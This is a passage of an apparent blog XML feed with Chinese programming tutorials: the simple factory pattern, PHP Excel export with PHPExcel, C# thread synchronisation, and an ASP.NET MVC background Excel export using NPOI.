36131;&#21407;&#21017;&#8221;&#12290;#3)&#22312;&#35843;&#29992;&#24037;&#21378;&#31867;&#30340;&#24037;&#21378;&#26041;&#27861;&#26102;&#65292;&#30001;&#20110;&#24037;&#21378;&#26041;&#27861;&#26159;&#38745;&#24577;&#26041;&#27861;&#65292;&#20351;&#29992;&#36215;&#26469;&#24456;&#26041;&#20415;&#65292;&#21487;&#36890;&#36807;&#31867;&#21517;&#30452;&#25509;&#35843;&#29992;&#65292;&#32780;&#19988;&#21482;&#38656;&#35201;&#20256;&#20837;&#19968;&#20010;&#31616;&#21333;&#30340;&#21442;&#25968;&#21363;&#21487;&#65292;&#22312;&#23454;&#38469;&#24320;&#21457;&#20013;&#65292;&#36824;&#21487;&#20197;&#22312;&#35843;&#29992;&#26102;&#23558;&#25152;&#20256;&#20837;&#30340;&#21442;&#25968;&#20445;&#23384;&#22312;XML&#31561;&#26684;&#24335;&#30340;&#37197;&#32622;&#25991;&#20214;&#20013;&#65292;&#20462;&#25913;&#21442;&#25968;&#26102;&#26080;&#39035;&#20462;&#25913;&#20219;&#20309;&#28304;&#20195;&#30721;&#12290;&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#26368;&#22823;&#30340;&#38382;&#39064;&#22312;&#20110;&#24037;&#21378;&#31867;&#30340;&#32844;&#36131;&#30456;&#23545;&#36807;&#37325;&#65292;&#22686;&#21152;&#26032;&#30340;&#20135;&#21697;&#38656;&#35201;&#20462;&#25913;&#24037;&#21378;&#31867;&#30340;&#21028;&#26029;&#36923;&#36753;&#65292;&#36825;&#19968;&#28857;&#19982;&#24320;&#38381;&#21407;&#21017;&#26159;&#30456;&#36829;&#32972;&#30340;&#12290;&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#30340;&#35201;&#28857;&#22312;&#20110;&#65306;&#24403;&#20320;&#38656;&#35201;&#20160;&#20040;&#65292;&#21482;&#38656;&#35201;&#20256;&#20837;&#19968;&#20010;&#27491;&#30830;&#30340;&#21442;&#25968;&#65292;&#23601;&#21487;&#20197;&#33719;&#21462;&#20320;&#25152;&#38656;&#35201;&#30340;&#23545;&#35937;&#65292;&#32780;&#26080;&#39035;&#30693;&#36947;&#20854;&#21019;&#24314;&#32454;&#33410;&#12290;4.3.4 模式应用1. JDK&#31867;&#24211;&#20013;&#24191;&#27867;&#20351;&#29992;&#20102;&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#65292;&#22914;&#24037;&#20855;&#31867;java.text.DateFormat&#65292;&#23427;&#29992;&#20110;&#26684;&#24335;&#21270;&#19968;&#20010;&#26412;&#22320;&#26085;&#26399;&#25110;&#32773;&#26102;&#38388;&#12290;public final static DateFormat getDateInstance();public final static DateFormat getDateInstance(int style);public final static DateFormat getDateInstance(int style,Localelocale);2. Java&#21152;&#23494;&#25216;&#26415;&#33719;&#21462;&#19981;&#21516;&#21152;&#23494;&#31639;&#27861;&#30340;&#23494;&#38053;&#29983;&#25104;&#22120;:KeyGenerator keyGen=KeyGenerator.getInstance("DESede");&#21019;&#24314;&#23494;&#30721;&#22120;:Cipher cp=Cipher.getInstance("DESede");4.4 工厂方法模式4.5 抽象工厂模式4.6 建造者模式4.7 原型模式4.8 单例模式5 结构型模式6 行为型模式]]></content>
      <categories>
        
          <category> 软件工程 </category>
        
      </categories>
      <tags>
        
          <tag> 设计模式 </tag>
        
          <tag> Design-Pattern </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 导入导出]]></title>
      <url>/php/2015/08/20/php-import-export/</url>
      <content type="text"><![CDATA[1 数据导入导出1.1 导入待更新1.2 一般导出1.2.1 核心代码header("Content-Type: application/vnd.ms-excel; charset=UTF-8"); header("Pragma: public"); header("Expires: 0"); header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); header("Content-Type: application/force-download"); header("Content-Type: application/octet-stream"); header("Content-Type: application/download"); header("Content-Disposition: attachment;filename=".$title .".xls "); header("Content-Transfer-Encoding: binary ");1.3 使用 PHPExcel1.3.1 下载https://github.com/PHPOffice/PHPExcel1.3.2 开始// &#23548;&#20837;PHPExcel.php&#25110;&#32773;&#20854;&#20182;&#25991;&#20214;require_once 'PHPExcel.php';// &#21019;&#24314;&#19968;&#20010;&#22788;&#29702;&#23545;&#35937;&#23454;&#20363; $objExcel = new PHPExcel();// &#33719;&#21462;&#23646;&#24615;$objProps = $objExcel-&gt;getProperties ();//&#35774;&#32622;&#21019;&#24314;&#32773;$objProps-&gt;setCreator ( 'XuLulu');//&#35774;&#32622;&#26368;&#21518;&#20462;&#25913;&#32773;$objProps-&gt;setLastModifiedBy("XuLulu");//&#25551;&#36848;$objProps-&gt;setDescription("&#25705;&#27604;&#29677;&#32423;");//&#35774;&#32622;&#26631;&#39064;$objProps-&gt;setTitle ( '&#31649;&#29702;&#22120;' );//&#35774;&#32622;&#39064;&#30446;$objProps-&gt;setSubject("OfficeXLS Test Document, Demo");//&#35774;&#32622;&#20851;&#38190;&#23383;$objProps-&gt;setKeywords ( '&#31649;&#29702;&#22120;' );//&#35774;&#32622;&#20998;&#31867;$objProps-&gt;setCategory ( "Test");//&#24037;&#20316;&#34920;&#35774;&#32622;$objExcel-&gt;setActiveSheetIndex( 0 );$objActSheet = $objExcel-&gt;getActiveSheet ();//&#21333;&#20803;&#26684;&#36171;&#20540;   &#20363;&#65306;$objActSheet-&gt;setCellValue ( 'A1', 'ID');$objActSheet-&gt;setCellValue ( 'B1', 'HashCode');$objActSheet-&gt;setCellValue ( 'C1', 'ModelName');$objActSheet-&gt;setCellValue ( 'D1', 'IndexName');$objActSheet-&gt;setCellValue('A1', '&#23383;&#31526;&#20018;&#20869;&#23481;');  // &#23383;&#31526;&#20018;&#20869;&#23481;  $objActSheet-&gt;setCellValue('A2', 26);            // &#25968;&#20540;  $objActSheet-&gt;setCellValue('A3', true);          // &#24067;&#23572;&#20540;$objActSheet-&gt;setCellValue('A4', '=SUM(A2:A2)'); // &#20844;&#24335;//&#33258;&#21160;&#35774;&#32622;&#21333;&#20803;&#26684;&#23485;&#24230;   &#20363;&#65306;$objActSheet-&gt;getColumnDimension('A')-&gt;setAutoSize(true);//&#25163;&#21160;&#35774;&#32622;&#21333;&#20803;&#26684;&#30340;&#23485;&#24230;   &#20363;&#65306;//$objActSheet-&gt;getColumnDimension('A')-&gt;setWidth(10);//&#23548;&#20986;&#30340;&#25991;&#20214;&#21517;$outputFileName = iconv ( 'UTF-8', 'gb2312', 'XuLulu_'. time() . '.xlsx' );//&#30452;&#25509;&#23548;&#20986;&#25991;&#20214;$objWriter-&gt;save ( $outputFileName );//&#25991;&#20214;&#30452;&#25509;&#36755;&#20986;&#21040;&#27983;&#35272;&#22120;header ( 'Pragma:public');header ( 'Expires:0');header ( 'Cache-Control:must-revalidate,post-check=0,pre-check=0');header ( 'Content-Type:application/force-download');header ( 'Content-Type:application/vnd.ms-excel');header ( 'Content-Type:application/octet-stream');header ( 'Content-Type:application/download');header ( 'Content-Disposition:attachment;filename='. $outputFileName );header ( 'Content-Transfer-Encoding:binary');$objWriter-&gt;save ( 'php://output');&#20854;&#20182;&#35774;&#32622;&#65306;//&#26174;&#24335;&#25351;&#23450;&#20869;&#23481;&#31867;&#22411;  $objActSheet-&gt;setCellValueExplicit('A5','847475847857487584',PHPExcel_Cell_DataType::TYPE_STRING);  //&#21512;&#24182;&#21333;&#20803;&#26684;  $objActSheet-&gt;mergeCells('B1:C22');  //&#20998;&#31163;&#21333;&#20803;&#26684;  $objActSheet-&gt;unmergeCells('B1:C22');//&#24471;&#21040;&#21333;&#20803;&#26684;&#30340;&#26679;&#24335;$objStyleA5 = $objActSheet-&gt;getStyle('A5');//&#35774;&#32622;&#23383;&#20307;  $objFontA5 = $objStyleA5-&gt;getFont();  $objFontA5-&gt;setName('Courier New');  $objFontA5-&gt;setSize(10);  $objFontA5-&gt;setBold(true);  $objFontA5-&gt;setUnderline(PHPExcel_Style_Font::UNDERLINE_SINGLE);  $objFontA5-&gt;getColor()-&gt;setARGB('FF999999');  //&#35774;&#32622;&#23545;&#40784;&#26041;&#24335;$objAlignA5 = $objStyleA5-&gt;getAlignment();  $objAlignA5-&gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_RIGHT);  $objAlignA5-&gt;setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);//&#35774;&#32622;&#36793;&#26694;  $objBorderA5 = $objStyleA5-&gt;getBorders();  $objBorderA5-&gt;getTop()-&gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);  $objBorderA5-&gt;getTop()-&gt;getColor()-&gt;setARGB('FFFF0000');// color  $objBorderA5-&gt;getBottom()-&gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);  $objBorderA5-&gt;getLeft()-&gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);  $objBorderA5-&gt;getRight()-&gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);  //&#35774;&#32622;&#22635;&#20805;&#39068;&#33394;  $objFillA5 = $objStyleA5-&gt;getFill();  $objFillA5-&gt;setFillType(PHPExcel_Style_Fill::FILL_SOLID);  $objFillA5-&gt;getStartColor()-&gt;setARGB('FFEEEEEE');  //&#20174;&#25351;&#23450;&#30340;&#21333;&#20803;&#26684;&#22797;&#21046;&#26679;&#24335;&#20449;&#24687;.  $objActSheet-&gt;duplicateStyle($objStyleA5,'B1:C22');  //*************************************  //&#28155;&#21152;&#22270;&#29255;  $objDrawing = new PHPExcel_Worksheet_Drawing();  $objDrawing-&gt;setName('ZealImg');  $objDrawing-&gt;setDescription('Image inserted byZeal');  $objDrawing-&gt;setPath('./zeali.net.logo.gif');  $objDrawing-&gt;setHeight(36);  $objDrawing-&gt;setCoordinates('C23');  $objDrawing-&gt;setOffsetX(10);  $objDrawing-&gt;setRotation(15);  $objDrawing-&gt;getShadow()-&gt;setVisible(true);  $objDrawing-&gt;getShadow()-&gt;setDirection(36);  $objDrawing-&gt;setWorksheet($objActSheet);  //&#28155;&#21152;&#19968;&#20010;&#26032;&#30340;worksheet  $objExcel-&gt;createSheet();  $objExcel-&gt;getSheet(1)-&gt;setTitle('&#27979;&#35797;2');  //&#20445;&#25252;&#21333;&#20803;&#26684;  $objExcel-&gt;getSheet(1)-&gt;getProtection()-&gt;setSheet(true);  $objExcel-&gt;getSheet(1)-&gt;protectCells('A1:C22','PHPExcel');1.3.3 一个简单示例conn.php文件&lt;?php$conn = array('host' =&gt;'127.0.0.1' ,'user_name' =&gt; 'root','password' =&gt; '','db_name' =&gt; 'test',"charset"=&gt;"utf8");?&gt;data.php&lt;?phprequire dirname(__FILE__).'\conn.php';class data{public $conn=null;public function __construct($config){ //&#26500;&#36896;&#26041;&#27861;&#65292;&#23454;&#20363;&#21270;&#31867;&#33258;&#21160;&#35843;&#29992;$this-&gt;conn=mysqli_connect($config['host'],$config['user_name'],$config['password'],$config['db_name']) or die(mysql_error());mysqli_query($this-&gt;conn,"set names utf8");// mysqli_query($conn,'set names'.$config['charset']) or die(mysql_error());}/** * &#26681;&#25454;&#20256;&#20837;&#30340;sql&#35821;&#21477; &#26597;&#35810;mysql&#32467;&#26524;&#38598;    * @param  [type] $sql [description]       * @return [type]      [description]          */          public function getResult($sql){          $resource=mysqli_query($this-&gt;conn,$sql) or die(mysql_error());          $res=array();          while (($row=mysqli_fetch_assoc($resource))!=false) {          $res[]=$row;          }          return $res;          }          public function getData($value)          {          $sql="SELECT * FROM user";          $res=self::getResult($sql);          return $res;          }}export.php&lt;?php$dir=dirname(__FILE__);require $dir.'\data.php';require $dir.'\PHPExcel\PHPExcel.php';$db=new data($conn);$objPHPExcel=new PHPExcel();for ($i=1; $i &lt; 3; $i++) {if ($i&gt;1) {$objPHPExcel-&gt;createSheet();}$objPHPExcel-&gt;setActiveSheetIndex($i-1);$objSheet=$objPHPExcel-&gt;getActiveSheet();$data=$db-&gt;getData($i);$objSheet-&gt;setCellValue("A1","&#22995;&#21517;")-&gt;setCellValue('B1','&#24180;&#40836;');$j=2;foreach ($data as $key =&gt; $value) {// $name = iconv('utf-8', 'gb2312', $value['name']);// $age = iconv('utf-8', 'gb2312', $value['age']);// echo $value['name'];$objSheet-&gt;setCellValue('A'.$j,$name)-&gt;setCellValue('B'.$j,$value['age'].'&#23681;');$j++;}}$objWriter=PHPExcel_IOFactory::createWriter($objPHPExcel,'Excel2007');browser_export('Excel7','example.xls');$objWriter-&gt;save('php://output');function browser_export($type,$filename){if ($type='Excel5') {header('Content-Type: application/vnd.ms-excel');  //excel5}else{header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'); //excel7}header('Content-Disposition: attachment;filename="'.$filename.'"');header('Cache-Control: max-age=0');}// $objWriter-&gt;save($dir.'\export_1.xls');?&gt;1.4 Referenceshttps://www.the-art-of-web.com/php/dataexport/]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP-导入导出 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Nginx]]></title>
      <url>/software/web-server/2015/07/19/nginx/</url>
      <content type="text"><![CDATA[1 简介]]></content>
      <categories>
        
          <category> software </category>
        
          <category> web-server </category>
        
      </categories>
      <tags>
        
          <tag> Nginx </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[C# ASP.NET 线程]]></title>
      <url>/c%23/2015/05/20/c-thead/</url>
      <content type="text"><![CDATA[1 线程入门1.1 创建线程using system;using system.Threading;ThreadStart entry = new ThreadStart(CalcSum);Thread workThread = new Thread(entry);//orThread workThread = new Thread(new ThreadStart(CalcSum));  //Method：static void CalcSum()  {       //do somethings.     }1.2 Thread类几个重要方法Thread类用于创建线程，ThreadPool类用于管理线程池。Thread类中几个重要的方法：1. Start()：启动线程；2. Sleep(int)：静态方法，暂停当前线程指定的毫秒数；3. Abort()：通常使用该方法来终止一个线程；4. Suspend()：该方法并不终止未完成的线程，它仅仅挂起线程，以后还可恢复；5. Resume()：恢复被Suspend()方法挂起的线程的执行。1.3 Thread.ThreadState属性Thread.ThreadState 在各种情况下的取值如下：1. Aborted：线程已停止2. AbortRequested：线程的Thread.Abort()方法已被调用，但是线程还未停止3. Background：线程在后台执行，与属性Thread.IsBackground有关(前台所有进程)4. Running：线程正在正常运行5. Stopped：线程已经被停止6. StopRequested：线程正在被要求停止7. Suspended：线程已经被挂起（此状态下，可以通过调用Resume()方法重新运行）8. SuspendRequested：线程正在要求被挂起，但是未来得及响应9. Unstarted：未调用Thread.Start()开始线程的运行10. WaitSleepJoin：线程因为调用了Wait(),Sleep()或Join()等方法处于封锁状态 1.4 设定线程优先级优先级由高到低分别是Highest，AboveNormal，Normal，BelowNormal，Lowest。默认为ThreadPriority.Normal。//示例：设定优先级为最低myThread.Priority=ThreadPriority.Lowest;2 线程的同步和通讯——生产者和消费者假设这样一种情况，两个线程同时维护一个队列，如果一个线程对队列中添加元素，而另外一个线程从队列中取用元素，那么我们称添加元素的线程为生产者，称取用元素的线程为消费者。2.1 lock关键字lock 关键字解决多个线程同时执行一个函数，导致数据的混乱，产生不可预料的结果的问题。lock 关键字将一段代码定义为互斥段（critical section）。互斥段在一个时刻内只允许一个线程进入执行，而其他线程必须等待。//定义如下：lock(expression) statement_block//expression代表你希望跟踪的对象，通常是对象引用。一般地，保护一个类的实例，可以使用this；保护一个静态变量（如互斥代码段在一个静态方法内部），一般使用类名就可以。//statement_block就是互斥段的代码，这段代码在一个时刻内只可能被一个线程执行。2.2 Monitor类(System.Threading)Monitor提供了使线程共享资源的方案。Monitor类可以锁定一个对象，一个线程只有得到这把锁才可以对该对象进行操作。......Queue oQueue=new Queue();......Monitor.Enter(oQueue);......//现在oQueue对象只能被当前线程操纵了Monitor.Exit(oQueue);//释放锁//为了保证线程最终都能释放锁，你可以把Monitor.Exit()方法写在try-catch-finally结构中的finally代码块里。//当拥有对象锁的线程准备释放锁时，它使用Monitor.Pulse()方法通知等待队列中的第一个线程。2.2.1 Monitor.Wait()和Monitor.Pulse()1. Wait()就是交出锁的使用权，使线程处于阻塞状态，直到再次获得锁的使用权。2. 当前线程调用Pulse()向队列中的下一个线程发出锁的信号。接收到脉冲后，等待线程就被移动到就绪队列中。在调用 Pulse 的线程释放锁后，就绪队列中的下一个线程（不一定是接收到脉冲的线程）将获得该锁。pulse()并不会使当前线程释放锁。3 实例：开辟一线程实现异步导出Excel3.1 环境介绍及实例简述环境介绍：开发语言》C#;开发工具》Visual studio 2015;Asp.Net MVC Version》5.2.3;.Net Version》6.1.3;NIPO version》2.2.1;实例简述：由于导出的Excel文件比较大，非常耗时，为了不影响对界面的其他操作，需要采用异步的方式进行导出。具体实现方法就是后台开辟一个线程将Excel导出到指定目录，然后提供下载。3.2 实现思路及准备工作思路：通过线程实现异步导出操作；通过NIPO组件将数据存到Excel文件中。准备工作：1.下载NPOI组件，http://npoi.codeplex.com/2.orcleHelper.dll3.3 实例代码3.3.1 UserController.csusing Project.BLL;using Project.Class;using Project.Interface;using Project.ViewModel;using System;using System.Collections.Generic;using System.IO;using System.Web.Mvc;using System.Web.Script.Serialization;namespace Project.UI{    /// &lt;summary&gt;    /// 文件信息类    /// &lt;/summary&gt;    public class FileInfoClass    {	public int count { set; get; }	public IList&lt;string&gt; d_fileList { set; get; }    }    /// &lt;summary&gt;    /// 用户控制器    /// &lt;/summary&gt;    public class UserController : BaseController    {	//用户接口	private IUserBLL iuser = new UserBLL();	//返回信息	private ReturnInfo returninfo = new ReturnInfo();	/// &lt;summary&gt;	/// 导出用户数据，返回文件列表	/// &lt;/summary&gt;	public ActionResult UserInfoExportExcel()	{	    //搜索条件Model对象	    SearchUserModel searchUserModel = new SearchUserModel();	    //1.获取数据(具体如何获取数据，这里没有陈述)	    List&lt;UserViewModel&gt; list = iuser.GetUserInfo(searchUserModel, ref returninfo) as List&lt;UserViewModel&gt;;	    //2.调用方法，导出Excel	    //生成文件名称（改文件名称）	    var fileName = string.Format("{0}用户信息表.xls", DateTime.Now.ToString("yyyyMMddHHssmm"));	    //判断目录是否存在（该目录名称）	    if (!Directory.Exists(Server.MapPath("~/Downloads/用户信息")))	    {		Directory.CreateDirectory(Server.MapPath("~/Downloads/用户信息"));	    }	    //将生成的文件保存到服务器临时文件夹中	    string fullPath = Path.Combine(Server.MapPath("~/Downloads/用户信息"), fileName);	    //表头	    Dictionary&lt;string, string&gt; tableHeader = new Dictionary&lt;string, string&gt;	    {		{ "user_id","用户编号" },		{ "username","用户名" },		{ "sex","性别" },		{ "age","年龄" },		{ "tel","联系电话"},		{ "email","邮箱"},		{ "user_type", "用户类型" },		{ "nickname", "用户昵称" }	    };	    //导出到Excel。(Global.asax.cs)	    MvcApplication._VehicleQueueT.Enqueue(new Classes.DataExportPara { excelPath=fullPath, sheetName = "用户信息", tableHeard= tableHeader, list =list});	    //获取路径	    string path = Server.MapPath("~/Downloads/用户信息");	    //获取所有xls文件路径	    IList&lt;string&gt; fileList = GetAllFileName(path);	    FileInfoClass f_info = new FileInfoClass();	    f_info.count = fileList.Count;	    f_info.d_fileList = fileList;	    //返回文件列表	    return new ContentResult	    {		Content = new JavaScriptSerializer { MaxJsonLength = Int32.MaxValue }.Serialize(f_info),		ContentType = "application/json"	    };	}	/// &lt;summary&gt;	/// 仅获取文件列表	/// &lt;/summary&gt;	/// &lt;returns&gt;&lt;/returns&gt;	public ActionResult GetFileLists()	{	    if (!Directory.Exists(Server.MapPath("~/Downloads/用户信息")))	    {		Directory.CreateDirectory(Server.MapPath("~/Downloads/用户信息"));	    }	    //路径	    string path = Server.MapPath("~/Downloads/用户信息");	    //	    IList&lt;string&gt; fileList = GetAllFileName(path);	    FileInfoClass f_info = new FileInfoClass();	    f_info.count = fileList.Count;	    f_info.d_fileList = fileList;	    return new ContentResult	    {		Content = new JavaScriptSerializer { MaxJsonLength = Int32.MaxValue }.Serialize(f_info),		ContentType = "application/json"	    };	}	/// &lt;summary&gt;	/// 删除文件	/// &lt;/summary&gt;	/// &lt;param name="fileName"&gt;&lt;/param&gt;	/// &lt;returns&gt;&lt;/returns&gt;	public ActionResult DeleteFile(string fileName)	{	    string result = "";	    //路径	    string filePath = Server.MapPath("~/Downloads/用户信息/"+fileName);	    if (!Directory.Exists(Server.MapPath("~/Downloads/已删除文件目录")))	    {		Directory.CreateDirectory(Server.MapPath("~/Downloads/已删除文件目录"));	    }	    string deletedFilePath = Server.MapPath("~/Downloads/已删除文件目录/"+fileName);	    try	    {		//System.IO.File.Delete(filePath);		//移动文件到"已删除文件目录"中		FileInfo file = new FileInfo(filePath);		file.MoveTo(deletedFilePath);		result += "成功删除文件";	    }	    catch (Exception)	    {		result += "删除文件失败";	    }	    //返回操作结果	    return Json(result, JsonRequestBehavior.AllowGet);	}	/// &lt;summary&gt;	/// 获取目录下的所有xls文件	/// &lt;/summary&gt;	/// &lt;param name="path"&gt;&lt;/param&gt;	/// &lt;returns&gt;&lt;/returns&gt;	private IList&lt;string&gt; GetAllFileName(string path)	{	    /*List&lt;FileInfo&gt; filelist = new List&lt;FileInfo&gt;();	    //if (System.IO.File.Exists(path+"\\*.xls"))	    var files = Directory.GetFiles(path, "*.xls");	    foreach (var file in files)	    {		filelist.Add(new FileInfo(file));	    }*/	    IList&lt;string&gt; list = new List&lt;string&gt;();	    DirectoryInfo folder = new DirectoryInfo(path);	    foreach (FileInfo file in folder.GetFiles("*.xls"))	    {		list.Add(file.Name);	    }	    return list;	}    }}3.3.2 Global.asax.csusing System;using System.Collections.Generic;using System.Linq;using System.Threading;using System.Web;using System.Web.Mvc;using System.Web.Optimization;using System.Web.Routing;using Project.Classes;namespace GpsProject.UI{    public class MvcApplication : System.Web.HttpApplication    {	//数据导出队列	public static Queue&lt;DataExportPara&gt; _VehicleQueueT = new Queue&lt;DataExportPara&gt;();	protected void Application_Start()	{	    AreaRegistration.RegisterAllAreas();	    FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);	    RouteConfig.RegisterRoutes(RouteTable.Routes);	    BundleConfig.RegisterBundles(BundleTable.Bundles);	    OutputVehicleExcel();//注册信息导出方法	}	/// &lt;summary&gt;	/// 导出信息	/// &lt;/summary&gt;	public static void OutputVehicleExcel()	{	    DataExportPara exportPara = null;	    ThreadPool.QueueUserWorkItem(o =&gt;	    {		while (true)		{		    if (_VehicleQueueT != null &amp;&amp; _VehicleQueueT.Count &gt; 0)		    {			exportPara = _VehicleQueueT.Dequeue();			if (exportPara != null)			{			    //调用方法			    DataExport.ExportExcel(exportPara.excelPath, exportPara.sheetName, exportPara.tableHeard, exportPara.list);			}			else			{			    Thread.Sleep(6000);			}		    }		    else		    {			Thread.Sleep(6000);		    }		}	    });	}    }}3.3.3 DataExportPara.csusing System.Collections;using System.Collections.Generic;namespace Project.Classes{    /// &lt;summary&gt;    /// 数据导出para    /// &lt;/summary&gt;    public class DataExportPara    {	/// &lt;summary&gt;	/// 导出路径	/// &lt;/summary&gt;	public string excelPath { get; set; }	/// &lt;summary&gt;	/// 数据列表	/// &lt;/summary&gt;	public IList list { get; set; }	/// &lt;summary&gt;	/// 工作表名称	/// &lt;/summary&gt;	public string sheetName { get; set; }	/// &lt;summary&gt;	/// 表头	/// &lt;/summary&gt;	public Dictionary&lt;string, string&gt; tableHeard {get;set;}    }}3.3.4 DataExport.csusing GpsProject.Class;using System.Collections;using System.Collections.Generic;using System.IO;namespace Project.Classes{    /// &lt;summary&gt;    /// 数据导出    /// &lt;/summary&gt;    public class DataExport    {	/// &lt;summary&gt;	/// 导出Excel到目录	/// &lt;/summary&gt;	/// &lt;param name="path"&gt;&lt;/param&gt;	/// &lt;param name="sheetName"&gt;&lt;/param&gt;	/// &lt;param name="tableHeard"&gt;&lt;/param&gt;	/// &lt;param name="list"&gt;&lt;/param&gt;	public static void ExportExcel(string path, string sheetName, Dictionary&lt;string, string&gt; tableHeard, IList list)	{	    using (var exportData = NPOIExcelHelper.ExportToExcelStream(list, sheetName, tableHeard))	    {		//创建一个文件		FileStream file = new FileStream(path, FileMode.Create, FileAccess.Write);		exportData.WriteTo(file);		file.Close();	    }	}    }}3.3.5 NPOIExcelHelper.csusing System;using System.Collections.Generic;using System.IO;using System.Linq;using NPOI.SS.UserModel;using System.Collections;namespace Project.Class{    /// &lt;summary&gt;    /// NPOI    /// &lt;/summary&gt;    public class NPOIExcelHelper    {	/// &lt;summary&gt;	/// 导出Excel到文件流	/// &lt;/summary&gt;	/// &lt;param name="dt"&gt;&lt;/param&gt;	/// &lt;param name="sheetName"&gt;&lt;/param&gt;	/// &lt;param name="tableHeard"&gt;&lt;/param&gt;	/// &lt;returns&gt;文件流&lt;/returns&gt;	public static MemoryStream ExportToExcelStream(IList lists, string sheetName, Dictionary&lt;string, string&gt; tableHeard)	{	    //创建一个工作簿	    NPOI.HSSF.UserModel.HSSFWorkbook book = new NPOI.HSSF.UserModel.HSSFWorkbook();	    NPOI.SS.UserModel.ISheet sheet = book.CreateSheet(sheetName); //创建sheet	    //Excel表头	    NPOI.SS.UserModel.IRow row = sheet.CreateRow(0); //创建行	    ICellStyle style = book.CreateCellStyle(); //创建单元格	    style.Alignment = HorizontalAlignment.Center; //对齐方式	    style.VerticalAlignment = VerticalAlignment.Center;  //单元格居中对齐	    #region 设置表头	    List&lt;string&gt; headers = tableHeard.Keys.ToList();	    for (int i = 0; i &lt; headers.Count; i++)	    {		ICell cell = row.CreateCell(i);		cell.CellStyle = style;		cell.SetCellValue(tableHeard[headers[i]]);	    }	    /*for (int i = 0; i &lt; dt.Columns.Count; i++)	    {		ICell cell = row.CreateCell(i);		cell.CellStyle = style;		cell.SetCellValue(dt.Columns[i].ColumnName);	    }*/	    #endregion	    #region 填充数据	    int rowIndex = 1;// 从第二行开始赋值(第一行已设置为单元头)	    if (lists != null &amp;&amp; lists.Count &gt; 0)	    {		foreach (var list in lists)		{		    IRow rowTemp = sheet.CreateRow(rowIndex);		    for (int i = 0; i &lt; headers.Count; i++)		    {			string cellValue = ""; // 单元格的值			object properotyValue = null; // 属性的值			System.Reflection.PropertyInfo properotyInfo = null; // 属性的信息			if (headers[i].IndexOf(".") &gt; 0)			{			    // 3.1.1 解析子类属性(这里只解析1层子类，多层子类未处理)			    string[] properotyArray = headers[i].Split(new string[] { "." }, StringSplitOptions.RemoveEmptyEntries);			    string subClassName = properotyArray[0]; // '.'前面的为子类的名称			    string subClassProperotyName = properotyArray[1]; // '.'后面的为子类的属性名称			    System.Reflection.PropertyInfo subClassInfo = list.GetType().GetProperty(subClassName); // 获取子类的类型			    if (subClassInfo != null)			    {				// 3.1.2 获取子类的实例				var subClassEn = list.GetType().GetProperty(subClassName).GetValue(list, null);				// 3.1.3 根据属性名称获取子类里的属性类型				properotyInfo = subClassInfo.PropertyType.GetProperty(subClassProperotyName);				if (properotyInfo != null)				{				    properotyValue = properotyInfo.GetValue(subClassEn, null); // 获取子类属性的值				}			    }			}			else			{			    // 3.2 若不是子类的属性，直接根据属性名称获取对象对应的属性			    properotyInfo = list.GetType().GetProperty(headers[i]);			    if (properotyInfo != null)			    {				properotyValue = properotyInfo.GetValue(list, null);			    }			}			// 3.3 属性值经过转换赋值给单元格值			if (properotyValue != null)			{			    cellValue = properotyValue.ToString();			    // 3.3.1 对时间初始值赋值为空			    if (cellValue.Trim() == "0001/1/1 0:00:00" || cellValue.Trim() == "0001/1/1 23:59:59")			    {				cellValue = "";			    }			}			// 3.4 填充到Excel的单元格里			ICell icellcontent = rowTemp.CreateCell(i);			//icellcontent.CellStyle = Getcellstyle(workbook, cellStylecontent, fontcontent, stylexls.默认);			icellcontent.SetCellValue(cellValue);		    }		    rowIndex++;		    //达到65535行，跳出循环		    if (rowIndex== 65535)		    {			break;		    }		}	    }	    else	    {		//导出空数据		sheet.AddMergedRegion(new NPOI.SS.Util.CellRangeAddress(2, 2, 0, headers.Count - 1));		IRow row2 = sheet.CreateRow(1);		ICell icellkong = row2.CreateCell(0);		//  icellkong.CellStyle = Getcellstyle(workbook, stylexls.默认);		string str = "没有满足条件的数据可导出";		icellkong.SetCellValue(str);	    }	    /* for (int i = 1; i &lt;= dt.Rows.Count; i++)//遍历DataTable行	 {	     DataRow dataRow = dt.Rows[i - 1];	     row = sheet.CreateRow(i);//在工作表中添加一行	     for (int j = 0; j &lt; dt.Columns.Count; j++)//遍历DataTable列	     {		 ICell cell = row.CreateCell(j);//在行中添加一列		 cell.SetCellValue(dataRow[j].ToString());//设置列的内容   	     }	 }*/	    #endregion	    MemoryStream ms = new MemoryStream();	    book.Write(ms);	    return ms; //返回文件流	}    }}3.4 小结在阅读别人的文章时，认真。4 实例：利用线程监听模拟车辆进出智能化停车场4.1 实例简述4.2 实现效果4.3 主要代码4.3.1 Main.csprivate void Main_Load(object sender, EventArgs e){    MessagePrint.UpdateEventInfo += new MessagePrint.ShowEventInfoHandler(UpdateRuntimeInfo);    //&#35774;&#32622;&#24320;&#22987;&#12289;&#32467;&#26463;&#26102;&#38388;&#20026;00:00:00    dateTimePicker_InStart.Text = ConfigInfoHelper.InStartRunTime;    dateTimePicker_InEnd.Text = ConfigInfoHelper.InEndRunTime;    dateTimePicker_OutStart.Text = ConfigInfoHelper.OutStartRunTime;    dateTimePicker_OutEnd.Text = ConfigInfoHelper.OutEndRunTime;    //&#33719;&#21462;&#40664;&#35748;&#26102;&#38388;    BTModel.InStartRunTime = ConfigInfoHelper.InStartRunTime;    BTModel.InEndRunTime = ConfigInfoHelper.InEndRunTime;    BTModel.OutStartRunTime = ConfigInfoHelper.OutStartRunTime;    BTModel.OutEndRunTime = ConfigInfoHelper.OutEndRunTime;    vehicleio = new VehicleIO(BTModel);    vehicleio.StartServer();}/// &lt;summary&gt;/// 